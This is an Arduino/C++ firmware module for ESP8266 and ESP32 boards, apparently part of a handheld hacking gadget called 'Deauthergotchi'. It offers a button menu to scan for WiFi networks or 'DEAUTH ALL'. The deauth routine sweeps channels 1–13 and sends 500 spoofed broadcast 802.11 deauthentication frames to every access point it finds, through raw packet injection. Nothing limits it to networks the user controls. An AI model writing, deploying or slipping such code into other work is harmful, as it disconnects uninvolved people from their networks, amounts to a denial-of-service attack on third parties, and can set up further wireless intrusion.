// Platform-specific includes for WiFi packet injection
#ifdef ESP8266
extern "C" {
  #include "user_interface.h"
}
#elif defined(ESP32)
#include "esp_wifi.h"
#include "esp_err.h"
#endif

String deauth_command[] = {"< SCAN >", "< DEAUTH ALL>", "< STOP >"  };

int deauth_selectedMode = 0;
int deauth_commandLength = 3;
Button2 deauth_ButtonLeft;
Button2 deauth_ButtonRight;
Button2 deauth_ButtonA;
Button2 deauth_ButtonB;
bool once = false;
bool deauth_showmenu = true;

void deauthergotchi_setup()
{
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  delay(100);
  
  #ifdef ESP32
  // Enable promiscuous mode for ESP32 to allow packet injection
  esp_wifi_set_promiscuous(true);
  #endif
  
  displayClearDisplay();
  displaySetSize(1);
  displaySetCursor(0, 5);
  displayPrintln("DEAUTHERGOTCHI");
  displayPrintln("");
  #ifdef ESP32
  displayPrintln("ESP32 Mode");
  #elif defined(ESP8266)
  displayPrintln("ESP8266 Mode");
  #endif
  displayDisplay();
  delay(1000);

  
  deauth_ButtonLeft.begin(BTN_LEFT);
  deauth_ButtonRight.begin(BTN_RIGHT);
  deauth_ButtonA.begin(BTN_A);
  deauth_ButtonB.begin(BTN_B);
  deauth_ButtonLeft.setPressedHandler(deauth_LeftButtonPressed);
  deauth_ButtonRight.setPressedHandler(deauth_RightButtonPressed);
  deauth_ButtonA.setPressedHandler(deauth_AButtonPressed);
  deauth_ButtonB.setPressedHandler(deauth_BButtonPressed);
}

void deauthergotchi_loop()
{
    
    if( deauth_showmenu)
   {
    displayClearDisplay();
    displaySetCursor(0, 5);
    displayPrintln("DEAUTHERGOTCHI (v_v)");
    displayPrintln(" ");
    displayPrintln(deauth_command[deauth_selectedMode]);
   }
    if( deauth_selectedMode ==0 && once)
   {
    scanAndDisplayNetworks();
    once=false;
    deauth_showmenu=false;
   }
   if( deauth_selectedMode ==1 && once)
   {
    scanNetworksAndDeauth();
    once=false;
    deauth_showmenu=false;
   }

  displayDisplay();

  deauth_ButtonLeft.loop();
  deauth_ButtonRight.loop();
  deauth_ButtonA.loop();
  deauth_ButtonB.loop();
}


void deauth_LeftButtonPressed(Button2 &btn) {
   deauth_selectedMode--;
    if(deauth_selectedMode< 0 )deauth_selectedMode=deauth_commandLength-1;
}

void deauth_RightButtonPressed(Button2 &btn) {
 deauth_selectedMode++;
    if(deauth_selectedMode>=deauth_commandLength)deauth_selectedMode=0;
}

void deauth_AButtonPressed(Button2 &btn) {
  //playTone();
  once = true;
  deauth_showmenu=false;
}
void deauth_BButtonPressed(Button2 &btn) {
  //playTone();
  deauth_showmenu=true;
}

void scanAndDisplayNetworks() {
  int n = WiFi.scanNetworks();
  
  displayClearDisplay();
  
  if (n == 0) {
    displaySetCursor(0,0);
    displayPrintln("No networks found");
    Serial.println("No networks found");
    displayDisplay();
    return;
  }

  int linesPerScreen = SCREEN_HEIGHT / 10; // Calculate how many lines fit on the screen
  for (int start = 0; start < n; start += linesPerScreen) {
    displayClearDisplay();
    
    for (int i = start; i < start + linesPerScreen && i < n; ++i) {
      displaySetCursor(0, (i - start) * 10);
      displayPrint(String(i + 1));
      displayPrint(": ");
      displayPrint(WiFi.SSID(i));
      
    }
    
    displayDisplay();
    delay(1000); // Pause to allow reading of the current screen
  }
  
  displayDisplay();

}

void scanNetworksAndDeauth() {
  for (int channel = 1; channel <= 13; channel++) {
    #ifdef ESP8266
    wifi_set_channel(channel);
    #elif defined(ESP32)
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    #endif
    int n = WiFi.scanNetworks();
    displayClearDisplay();
    displaySetCursor(0,10);

    displayPrintln("Channel :"+String(channel)+" H:"+ String(n) );
    displayDisplay();

    for (int i = 0; i < n; ++i) {
      displaySetCursor(0,20);
      displayPrintln("attack running:");
      deauthClients(WiFi.BSSID(i));
      delay(100);
      displayDisplay();
    }
    displayDisplay();
    delay(1000);
    displayPrintln("complete!");
    delay(1000);
    displayDisplay();
  }
}

void deauthClients(uint8_t *bssid) {
  // Deauthentication frame structure (IEEE 802.11)
  uint8_t packet[26] = {
    0xC0, 0x00,             // Frame Control: Deauthentication
    0x3A, 0x01,             // Duration
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination MAC (broadcast to all clients)
    bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5], // Source MAC (AP BSSID)
    bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5], // BSSID (AP address)
    0x00, 0x00,             // Sequence Number
    0x07, 0x00              // Reason code: Class 3 frame received from nonassociated STA
  };

  for (int i = 0; i < 500; i++) { // Send multiple packets to ensure disconnection
    #ifdef ESP8266
    wifi_send_pkt_freedom(packet, sizeof(packet), false);
    #elif defined(ESP32)
    esp_wifi_80211_tx(WIFI_IF_STA, packet, sizeof(packet), false);
    #endif
    delay(10);
  }
}